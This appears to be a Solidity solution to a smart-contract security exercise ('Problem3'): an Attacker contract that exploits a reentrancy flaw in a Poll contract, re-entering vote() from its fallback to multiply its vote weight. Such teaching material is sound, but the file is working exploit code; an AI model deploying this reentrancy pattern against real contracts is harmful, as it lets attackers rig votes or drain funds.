// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Poll} from "../src/Problem3.sol";

contract Attacker {

    Poll poll; // The smart contract to exploit.
    uint8 numReentrancies; // The number of times we re-entered the contract.

    // Initialize the contract attributes.
    constructor(Poll _poll) {
        poll = _poll;
        numReentrancies = 0;
    }

    // Deposit 10 ETH and vote for option 2.
    function attack() public payable {
        poll.deposit{value: 10 ether}();
        poll.vote(2);
    }

    // Standard reentrancy. When receiving the vote,
    // our balance has not been reset, so vote 10 more
    // times. This will make our vote count 110.
    fallback() external payable {
        if (numReentrancies < 10) {
            numReentrancies++;
            poll.vote(2);
        }
    }

}